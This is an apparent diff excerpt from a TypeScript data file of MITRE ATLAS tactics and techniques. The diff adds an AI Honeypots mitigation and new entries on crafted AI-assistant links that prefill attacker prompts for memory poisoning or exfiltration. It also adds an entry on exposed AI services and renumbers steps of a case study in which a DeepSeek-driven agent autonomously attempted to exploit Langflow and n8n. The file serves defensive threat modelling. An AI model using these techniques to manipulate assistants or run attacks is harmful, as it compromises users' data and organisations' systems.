+        "parentTechniqueId": "AML.T0006",
+        "parentTechniqueName": "Active Scanning",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.003",
+        "platforms": [
+          "Agentic AI",
+          "Enterprise"
+        ],
+        "maturity": "Demonstrated",
+        "attackReference": {
+          "id": "T1595",
+          "url": "https://attack.mitre.org/techniques/T1595/"
+        },
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "By capturing adversarial fingerprinting behavior, honeypots can help provide early warning of sweeping activity meant to discover exposed AI targets and attack surfaces being explored by adversaries.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [
+          {
+            "id": "AML.CS0037",
+            "name": "Data Exfiltration via Agent Tools in Copilot Studio",
+            "url": "https://atlas.mitre.org/studies/AML.CS0037"
+          }
+        ],
+        "procedureExamples": [
+          {
+            "caseStudyId": "AML.CS0037",
+            "caseStudyName": "Data Exfiltration via Agent Tools in Copilot Studio",
+            "description": "The researchers look for support email addresses on the target organization's website which may be managed by an AI agent. Then, they probe the system by sending emails and looking for indications of agentic AI in automatic replies.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0037",
+            "stepId": "S00",
             "tacticId": "AML.TA0002"
           }
         ],
@@ -773,7 +1025,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0095",
         "name": "Search Open Websites/Domains",
-        "description": "Adversaries may search public websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).",
+        "description": "Adversaries may search public websites and/or domains for information about victims and AI targets that can be used during targeting and to discover opportunities for successful attacks. Information about a victim's attack surface may be available in various online sites, such as social media, news sites, or domains owned by the victim.\n\nAdversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).\n\nAdversaries may utilize OSINT-based discovery to map different AI assets by using search engine result pages, as well as backlink analysis, to locate agentic interfaces (which are frequently embedded via iFrames and follow predictable naming conventions). By analyzing the indexed URL structures of these sources from different search engines, attackers can often reverse-engineer internal environment IDs and organization-specific naming conventions. This intelligence gathering significantly narrows the search space for any later targeted fuzzing or enumeration performed by [Active Scanning: Enumerate Hosted AI Resources](/techniques/AML.T0006.000).",
         "tacticId": "AML.TA0002",
         "tacticName": "Reconnaissance",
         "tactics": [
@@ -801,7 +1053,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "url": "https://attack.mitre.org/techniques/T1593/"
         },
         "createdDate": "2025-11-05",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [
           {
             "id": "AML.M0000",
@@ -809,6 +1061,13 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
             "useDescription": "Limit public technical and organizational information that reveals the AI stack, services, personnel, or other targeting details on websites and domains.",
             "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+          },
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Decoy assets, such as honeypots, can act as a first contact for adversarial activity and reveal discovery channels that attackers are using to find web AI assets for targeting.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
           }
         ],
         "caseStudies": [
@@ -882,7 +1141,15 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         },
         "createdDate": "2026-04-22",
         "modifiedDate": "2026-05-27",
-        "mitigations": [],
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Decoy assets, such as honeypots, can act as a first contact for adversarial activity and reveal discovery channels that attackers are using to find web AI assets for targeting.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
         "caseStudies": [
           {
             "id": "AML.CS0051",
@@ -922,7 +1189,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek searched GitHub for trending 2026 CVE PoC repositories sorted by stars.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S14",
+            "stepId": "S13",
             "tacticId": "AML.TA0002"
           }
         ],
@@ -1019,7 +1286,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek investigated Langflow, determined what information and prerequisites were needed, and selected follow-on reconnaissance based on returned results.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S08",
+            "stepId": "S07",
             "tacticId": "AML.TA0002"
           },
           {
@@ -1027,7 +1294,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek assessed Langflow as low value, surveyed exposure across 10 product families, compared vulnerability severity, deployment footprint, PoC availability, and prerequisites, and selected n8n.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S13",
+            "stepId": "S12",
             "tacticId": "AML.TA0002"
           },
           {
@@ -1894,6 +2161,11 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0033",
             "name": "Live Deepfake Image Injection to Evade Mobile KYC Verification",
             "url": "https://atlas.mitre.org/studies/AML.CS0033"
+          },
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
           }
         ],
         "procedureExamples": [
@@ -1903,6 +2175,14 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "The researchers obtained [Virtual Camera: Live Assist](https://apkpure.com/virtual-camera-live-assist/virtual.camera.app), an Android app that allows a user to substitute the devices camera  with a video stream. This app works on genuine, non-rooted Android devices.",
             "url": "https://atlas.mitre.org/studies/AML.CS0033",
             "stepId": "S03",
+            "tacticId": "AML.TA0003"
+          },
+          {
+            "caseStudyId": "AML.CS0072",
+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "Operators adopted publicly available tooling built to generate AI assistant links carrying embedded memory instructions. The tooling included an npm package, a web-based link generator, and website plugins marketed as a search optimization technique for large language models.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
+            "stepId": "S00",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2078,7 +2358,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "The actor obtained and configured Hermes Agent as the offensive framework, together with scripts and conventional scanning and exploitation utilities. Hermes provided terminal access, Telegram-based operator control, and a skills system.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S02",
+            "stepId": "S01",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2181,7 +2461,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "The actor obtained access to several generative-AI models and services while evaluating an operational toolset. DeepSeek was selected as the primary reasoning engine for the autonomous attack activity.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S01",
+            "stepId": "S00",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2264,7 +2544,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek downloaded a public PoC for Langflow CVE-2026-33017. The report does not establish material modification.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S10",
+            "stepId": "S09",
             "tacticId": "AML.TA0003"
           },
           {
@@ -2272,7 +2552,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek downloaded the public n8n PoC chaining CVE-2026-21858 and CVE-2025-68613 and inspected its affected versions and prerequisites.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S15",
+            "stepId": "S14",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2317,7 +2597,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "The actor obtained agent-specific capabilities, including Hermes's framework-bundled godmode skill and the open-source FofaMap MCP server. The MCP server exposed FOFA asset search, natural-language query translation, and Nuclei scan generation to DeepSeek. Unit 42 does not establish that godmode was invoked during the recovered session.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S03",
+            "stepId": "S02",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2732,7 +3012,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "The actor created two Hermes skills. web-terminal-exploitation encoded a procedure for unauthenticated WebSocket exploitation, while fofa-cyberspace-search instructed DeepSeek to use the actor's fofoapi.py script for internet asset enumeration. The observed FOFA workflow is consistent with the latter skill; the report does not attribute an action in the recovered session to web-terminal-exploitation.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S04",
+            "stepId": "S03",
             "tacticId": "AML.TA0003"
           }
         ],
@@ -2974,6 +3254,11 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0066",
             "name": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
             "url": "https://atlas.mitre.org/studies/AML.CS0066"
+          },
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
           }
         ],
         "procedureExamples": [
@@ -3062,6 +3347,14 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "ZombieAgent: Data Exfiltration Attack on ChatGPT",
             "description": "The researchers prepared infrastructure to receive exfiltrated data.",
             "url": "https://atlas.mitre.org/studies/AML.CS0066",
+            "stepId": "S01",
+            "tacticId": "AML.TA0003"
+          },
+          {
+            "caseStudyId": "AML.CS0072",
+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "Operators embedded the crafted link into their own web properties as a \"Summarize with AI\" button or share widget. In some cases, the same links were distributed through email.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
             "stepId": "S01",
             "tacticId": "AML.TA0003"
           }
@@ -3439,7 +3732,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
     "id": "AML.TA0001",
     "shortname": "aml.ta0001",
     "name": "AI Attack Adaptation",
-    "description": "The adversary is adapting capabilities, methods, knowledge, or objectives into attack-ready outputs for a target or current operational conditions.\n\n[AI Attack Adaptation](/tactics/AML.T0001) consists of techniques adversaries use to transform reusable capabilities, general attack methods, target knowledge, high-level objectives, and operational observations into target- or context-specific attack-ready outputs. Adaptation may target an AI system directly, or it may use an AI capability to materially shape malicious content for attacks against AI components, software, infrastructure, people, or other systems. Adapted outputs may include proxy or manipulated models, adversarial data, crafted prompts or retrieval content, deepfakes, or generated malicious commands or code. Outputs can also include actions for an autonomous agent such as agent tasking, high-level objectives, action sequences, and tool instructions.\n\nAI Attack Adaptation may occur before [Initial Access](/tactics/AML.TA0004) is achieved and repeatedly throughout an operation. Adversaries may use knowledge obtained through [Reconnaissance](/tactics/AML.TA0002) or [Discovery](/tactics/AML.TA0008), access obtained through [AI Model Access](/tactics/AML.TA0000), and capabilities established through [Resource Development](/tactics/AML.TA0003). [Resource Development](/tactics/AML.TA0003) creates or obtains reusable capabilities whereas [AI Attack Adaptation](/tactics/AML.TA0001) applies or modifies those capabilities for a target, objective, or current operational condition.",
+    "description": "The adversary is adapting capabilities, methods, knowledge, or objectives into attack-ready outputs for a target or current operational conditions.\n\n[AI Attack Adaptation](/tactics/AML.TA0001) consists of techniques adversaries use to transform reusable capabilities, general attack methods, target knowledge, high-level objectives, and operational observations into target- or context-specific attack-ready outputs. Adaptation may target an AI system directly, or it may use an AI capability to materially shape malicious content for attacks against AI components, software, infrastructure, people, or other systems. Adapted outputs may include proxy or manipulated models, adversarial data, crafted prompts or retrieval content, deepfakes, or generated malicious commands or code. Outputs can also include actions for an autonomous agent such as agent tasking, high-level objectives, action sequences, and tool instructions.\n\nAI Attack Adaptation may occur before [Initial Access](/tactics/AML.TA0004) is achieved and repeatedly throughout an operation. Adversaries may use knowledge obtained through [Reconnaissance](/tactics/AML.TA0002) or [Discovery](/tactics/AML.TA0008), access obtained through [AI Model Access](/tactics/AML.TA0000), and capabilities established through [Resource Development](/tactics/AML.TA0003). [Resource Development](/tactics/AML.TA0003) creates or obtains reusable capabilities whereas [AI Attack Adaptation](/tactics/AML.TA0001) applies or modifies those capabilities for a target, objective, or current operational condition.",
     "url": "https://atlas.mitre.org/tactics/AML.TA0001",
     "techniques": [
       {
@@ -5545,7 +5838,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek generated FOFA queries, shell commands, scanner invocations, and direct HTTP probes based on the results returned during the session.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S07",
+            "stepId": "S06",
             "tacticId": "AML.TA0001"
           }
         ],
@@ -5641,7 +5934,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "After receiving an initial task, DeepSeek sequenced reconnaissance and exploitation actions, evaluated failed prerequisites, abandoned Langflow, compared alternative products and vulnerabilities, and selected n8n. Unit 42 recovered no additional operator input during the session.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S06",
+            "stepId": "S05",
             "tacticId": "AML.TA0001"
           },
           {
@@ -5784,7 +6077,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0124",
         "name": "Autonomous Attack Orchestration",
-        "description": "Adversaries may use autonomous AI systems as an operational control layer to manage multiple distinct autonomous agents or sub-agents toward a common adversary-defined objective. The orchestrating system may create assignments, select executors, allocate tools or resources, establish dependencies, schedule or synchronize activities, and track progress without a human directing each assignment.\n\nThe autonomous system exhibits centralized control over distributed execution including which agent performs which work, when it performs it, and how its output affects other assigned work. The system may aggregate findings and status from participating agents, request independent validation, reconcile conflicting results, prevent or resolve duplicated effort, and determine when an output satisfies a prerequisite for another activity. It may reassign stalled work, increase or reduce resources allocated to a branch, terminate low-value work, or initiate additional research or testing.\n\nOrchestration may use direct agent interfaces (See [Autonomous AI Agent Communication: Direct Agent Communication](/techniques/AMl.T0118.001)) to transmit assignments, status, and results.\n\nHuman involvement does not preclude autonomous attack orchestration. A human operator may define campaign objectives, select targets, provide infrastructure, establish constraints, or retain approval over consequential transitions.\n\n[Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
+        "description": "Adversaries may use autonomous AI systems as an operational control layer to manage multiple distinct autonomous agents or sub-agents toward a common adversary-defined objective. The orchestrating system may create assignments, select executors, allocate tools or resources, establish dependencies, schedule or synchronize activities, and track progress without a human directing each assignment.\n\nThe autonomous system exhibits centralized control over distributed execution including which agent performs which work, when it performs it, and how its output affects other assigned work. The system may aggregate findings and status from participating agents, request independent validation, reconcile conflicting results, prevent or resolve duplicated effort, and determine when an output satisfies a prerequisite for another activity. It may reassign stalled work, increase or reduce resources allocated to a branch, terminate low-value work, or initiate additional research or testing.\n\nOrchestration may use direct agent interfaces (See [Autonomous AI Agent Communication: Direct Agent Communication](/techniques/AML.T0118.001)) to transmit assignments, status, and results.\n\nHuman involvement does not preclude autonomous attack orchestration. A human operator may define campaign objectives, select targets, provide infrastructure, establish constraints, or retain approval over consequential transitions.\n\n[Autonomous Attack-Path Adaptation](/techniques/AML.T0117) and [Autonomous Attack Orchestration](/techniques/AML.T0124) may occur together but describe different control functions. Attack-path adaptation captures how evidence changes the selected path. Attack orchestration captures how work is allocated, coordinated, validated, and redirected across agents.",
         "tacticId": "AML.TA0001",
         "tacticName": "AI Attack Adaptation",
         "tactics": [
@@ -7100,7 +7393,15 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         },
         "createdDate": "2023-02-28",
         "modifiedDate": "2026-05-27",
-        "mitigations": [],
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Honeypots can safely absorb real attacks and exploit attempts, turning payloads into mapped defensive signatures for a potential target without risking real assets.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
         "caseStudies": [
           {
             "id": "AML.CS0023",
@@ -7116,11 +7417,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "id": "AML.CS0030",
             "name": "LLM Jacking",
             "url": "https://atlas.mitre.org/studies/AML.CS0030"
-          },
-          {
-            "id": "AML.CS0048",
-            "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-            "url": "https://atlas.mitre.org/studies/AML.CS0048"
           },
           {
             "id": "AML.CS0052",
@@ -7174,14 +7470,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0004"
           },
           {
-            "caseStudyId": "AML.CS0048",
-            "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-            "description": "The researcher exploited a proxy misconfiguration present in ClawdBot's control server to gain access to control interfaces that had authentication enabled.",
-            "url": "https://atlas.mitre.org/studies/AML.CS0048",
-            "stepId": "S01",
-            "tacticId": "AML.TA0004"
-          },
-          {
             "caseStudyId": "AML.CS0052",
             "caseStudyName": "LLMSmith: RCE Vulnerabilities in LLM-Integrated Applications",
             "description": "The researchers targeted public-facing applications that expose an AI agent to user input as a means to execute their prompts.",
@@ -7210,7 +7498,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek attempted exploitation, but no target exposed either required prerequisite. No access was obtained.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S12",
+            "stepId": "S11",
             "tacticId": "AML.TA0004"
           },
           {
@@ -7218,7 +7506,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
             "description": "DeepSeek attempted to find and exploit a system meeting the PoC prerequisites. All discovered forms required authentication, and no attempt produced file read, code execution, or initial access.",
             "url": "https://atlas.mitre.org/studies/AML.CS0070",
-            "stepId": "S18",
+            "stepId": "S17",
             "tacticId": "AML.TA0004"
           },
           {
@@ -7644,7 +7932,15 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         "maturity": "Demonstrated",
         "createdDate": "2025-10-29",
         "modifiedDate": "2026-05-27",
-        "mitigations": [],
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Since honeypots capture real input, they can provide visibility into attacks and prompt payloads that are target-specific.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
         "caseStudies": [
           {
             "id": "AML.CS0016",
@@ -7883,6 +8179,97 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           }
         ],
         "references": []
+      },
+      {
+        "id": "AML.T0131",
+        "name": "Crafted AI Assistant Links",
+        "description": "Adversaries may craft links that open an AI assistant or agent with attacker-controlled input already supplied, so that opening the link initiates an interaction the adversary defines rather than one the target composed. Many AI assistants accept a prompt through URL parameters (for example `?q=` or `?prompt=`) that is automatically populated, and in some cases submitted, when the link is opened. By encoding a chosen prompt into such a link, an adversary can cause the target's assistant to act on supplied instructions as soon as the link is opened.\n\nThese links are frequently disguised as helpful actions, such as a \"Summarize with AI\" button or a share link, and distributed through web pages, emails, documents, or messages. Because the resulting interaction runs in the target's own assistant session, a crafted link can drive a range of downstream impacts depending on the supplied instructions, such as exfiltrating data the assistant can access or for [AI Recommendation Poisoning](/techniques/AML.T0131).",
+        "tacticId": "AML.TA0004",
+        "tacticName": "Initial Access",
+        "tactics": [
+          {
+            "id": "AML.TA0004",
+            "name": "Initial Access"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0131",
+        "platforms": [
+          "Generative AI",
+          "Agentic AI"
+        ],
+        "maturity": "Realized",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [],
+        "caseStudies": [
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
+          }
+        ],
+        "procedureExamples": [
+          {
+            "caseStudyId": "AML.CS0072",
+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "The user clicked the button or link, which opened the AI assistant domain with the operator's prompt pre-populated in the input field via a `?q=` or `?prompt=` parameter.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
+            "stepId": "S02",
+            "tacticId": "AML.TA0004"
+          }
+        ],
+        "references": []
+      },
+      {
+        "id": "AML.T0132",
+        "name": "Misconfigured or Publicly Exposed AI Services",
+        "description": "AI agents and LLM platforms are deployed across diverse architectures, including standalone servers, SaaS platforms, and low-code builders. All of these often have misconfigured access controls, ranging from missing authentication in LLM runtimes to permissive public access settings, that significantly expand their attack surface.\n\nAI agent's security posture affects how attackers are able to explore which agentic attack surface is available to them and directly either expands or limits an adversary's ability to discover and interact with a target's AI agents. For example, one internet-facing AI service could be more easily discoverable by any unauthenticated user, while another may require compromised credentials to even be discovered.\n\nAdversaries may discover and interact with AI agents and LLM services as unauthenticated users via a combination of various OSINT and active scanning methods. These could include using search engines to discover accessible agentic deployments (See [Search Open Technical Databases](/techniques/AML.T0000)), search backlinks which could indicate existing or open agents which have been embedded to frontends (See [Search Open Website/Domains](/techniques/AML.T0095)), or directly scanning a target's AI infrastructure (See [Active Scanning](/techniques/AML.T0006)).",
+        "tacticId": "AML.TA0004",
+        "tacticName": "Initial Access",
+        "tactics": [
+          {
+            "id": "AML.TA0004",
+            "name": "Initial Access"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0132",
+        "platforms": [
+          "Predictive AI",
+          "Generative AI",
+          "Agentic AI"
+        ],
+        "maturity": "Demonstrated",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
